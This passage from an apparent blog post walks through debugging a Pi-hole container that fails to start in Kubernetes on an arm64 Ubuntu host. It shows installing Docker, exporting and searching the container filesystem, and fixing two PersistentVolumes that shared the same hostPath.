<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">uname</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-m</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">aarch64</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>But when reviewing the Docker documentation how to install the engine on Ubuntu, I saw that the only tabs available were <code>x86_64</code>/<code>amd64</code>, <code>armhf</code> or <code>arm64</code>.
So I did some research and found that the GNU triplet for the 64-bit ISA is <code>aarch64</code>. So essentially <code>aarch64</code> is <code>arm64</code>.
I ran the following commands to install Docker:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> apt-transport-https ca-certificates </span><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> gnupg lsb-release</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">n  </span><span class="token string" style="color:#e3116c">"deb [arch=arm64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu </span><span class="token string entity" style="color:#36acaa">\\</span><span class="token string" style="color:#e3116c">n  </span><span class="token string variable" style="color:#36acaa">$(</span><span class="token string variable" style="color:#36acaa">lsb_release </span><span class="token string variable parameter variable" style="color:#36acaa">-cs</span><span class="token string variable" style="color:#36acaa">)</span><span class="token string" style="color:#e3116c"> stable"</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">tee</span><span class="token plain"> /etc/apt/sources.list.d/docker.list </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt</span><span class="token plain"> update</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> docker-ce docker-ce-cli containerd.io</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I then created the pihole container:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:#36acaa">-it</span><span class="token plain"> pihole/pihole </span><span class="token function" style="color:#d73a49">bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>On another ssh session, I ran the following command on the host machine to download the content of the pihole image into an archive <code>pihole.tar</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># -l returns the latest container</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># -q quiet output</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">container_id</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">`</span><span class="token variable function" style="color:#d73a49">sudo</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable function" style="color:#d73a49">docker</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable function" style="color:#d73a49">ps</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable parameter variable" style="color:#36acaa">-lq</span><span class="token variable" style="color:#36acaa">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$container_id</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4565bc8fe1e1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">docker</span><span class="token plain"> </span><span class="token builtin class-name">export</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$container_id</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> pihole.tar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Now that I had the contents of the image, I can terminate the container by simply exiting the session created by docker run -it.
I could then decompress the tar:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">mkdir</span><span class="token plain"> /tmp/pihole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">tar</span><span class="token plain"> xvf pihole.tar </span><span class="token parameter variable" style="color:#36acaa">-C</span><span class="token plain"> /tmp/pihole</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>and review the source code to check why startup was failing.
Since I knew that the failure occurs on the following line:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">::: Testing pihole-FTL DNS: [cont-init.d] 20-start.sh: exited 1.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I could use the search for that particular line in the whole image filesystem I just extracted and see which file has the logic.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-rnw</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Testing pihole"</span><span class="token plain"> ./* </span><span class="token parameter variable" style="color:#36acaa">--exclude</span><span class="token plain"> pihole.tar</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./bash_functions.sh:260:    </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-n</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'::: Testing pihole-FTL DNS: '</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So we can see that this line is called in the shell script <code>bash_functions.sh</code> in line 260. This is what the scope looks like:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function-name function" style="color:#d73a49">test_configs</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     </span><span class="token builtin class-name">set</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-e</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-n</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'::: Testing pihole-FTL DNS: '</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">${DNSMASQ_USER</span><span class="token variable operator" style="color:#393A34">:-</span><span class="token variable" style="color:#36acaa">root}</span><span class="token plain"> pihole-FTL </span><span class="token builtin class-name">test</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> </span><span class="token builtin class-name">exit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-n</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'::: Testing lighttpd config: '</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     lighttpd </span><span class="token parameter variable" style="color:#36acaa">-t</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> /etc/lighttpd/lighttpd.conf </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> </span><span class="token builtin class-name">exit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     </span><span class="token builtin class-name">set</span><span class="token plain"> +e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"::: All config checks passed, cleared for startup ..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So seems that we’re running the command <code>pihole-FTL test</code>  as <code>root</code> and send an exit code of 1 if the command fails (which it does in this case). The next step is to figure out what’s the command: <code>pihole-FTL test</code>.
We can find the binary by searching for it in the whole extracted image filesystem:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">find</span><span class="token plain"> /tmp/pihole </span><span class="token parameter variable" style="color:#36acaa">-name</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"*pihole-FTL*"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/pihole-FTL</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I decided to recreate the container so I could interact with this binary:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Inside pihole container</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root@371cad2a9105:/</span><span class="token comment" style="color:#999988;font-style:italic"># pihole-FTL --help</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pihole-FTL - The Pi-hole FTL engine</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Usage:    </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">service</span><span class="token plain"> pihole-FTL </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">action</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">where </span><span class="token string" style="color:#e3116c">'&lt;action&gt;'</span><span class="token plain"> is one of start / stop / restart</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Available arguments:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            debug           More verbose logging,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            don</span><span class="token string" style="color:#e3116c">'t go into daemon mode</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">            test            Don'</span><span class="token plain">t start pihole-FTL but</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            instead quit immediately</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        -v, version         Return FTL version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token parameter variable" style="color:#36acaa">-vv</span><span class="token plain">                 Return </span><span class="token function" style="color:#d73a49">more</span><span class="token plain"> version information</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        -t, tag             Return </span><span class="token function" style="color:#d73a49">git</span><span class="token plain"> tag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        -b, branch          Return </span><span class="token function" style="color:#d73a49">git</span><span class="token plain"> branch</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        -f, no-daemon       Don</span><span class="token string" style="color:#e3116c">'t go into daemon mode</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        -h, help            Display this help and exit</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        dnsmasq-test        Test syntax of dnsmasq'</span><span class="token plain">s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            config files and </span><span class="token builtin class-name">exit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        regex-test str      Test str against all regular</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            expressions </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> the database</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        regex-test str rgx  Test str against regular expression</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            given by rgx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        --lua, lua          FTL</span><span class="token string" style="color:#e3116c">'s lua interpreter</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        --luac, luac        FTL'</span><span class="token plain">s lua compiler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        dhcp-discover       Discover DHCP servers </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> the </span><span class="token builtin class-name">local</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            network</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sqlite3             FTL's SQLite3 shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Online help: https://github.com/pi-hole/FTL</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The strange is that running the same command, in a Docker container where PiHole loads successfully, also returns an exit code of 1:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Inside pihole container</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root@371cad2a9105: </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> pihole-FTL </span><span class="token builtin class-name">test</span><span class="token punctuation" style="color:#393A34">;</span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$?</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This threw me off a bit. My main question was: How come the Docker container’s initialization script finishes successfully but the same container running in a Kubernetes Pod fails?
I had to take a step back and try to understand what’s the biggest difference between the Docker method that works and the Kubernetes method that fails. The only possible differences that I could think of were (1) no port forwarding, host network on Docker (2) no presistent storage set up in Docker.
Since I always seem to have a problem with using the <code>StorageClass</code>, <code>PersistentVolume</code> and <code>PersistentVolumeClaim</code> APIs in Kubernetes, my gut told me that I had mis-configured something there.
When navigating back to the mount path that I set in the PV YAML specification, I noticed that in both PVs (etc, <code>dnsmasq</code>) I set the path to be the same, namely <code>/home/ubuntu/pihole/data</code>. I decided I would create two different mount points, and retest it.
Below are the modifications I made (see comment):</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># volume-etc.yaml</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">apiVersion</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> v1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">kind</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> PersistentVolume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">metadata</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> pihole</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">volume</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">labels</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">type</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">spec</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">storageClassName</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> manual</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">capacity</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">storage</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> 1Gi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">accessModes</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> ReadWriteOnce</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">hostPath</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">path</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"/home/ubuntu/pihole/data/etc"</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># Changed from /home/ubuntu/data/</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
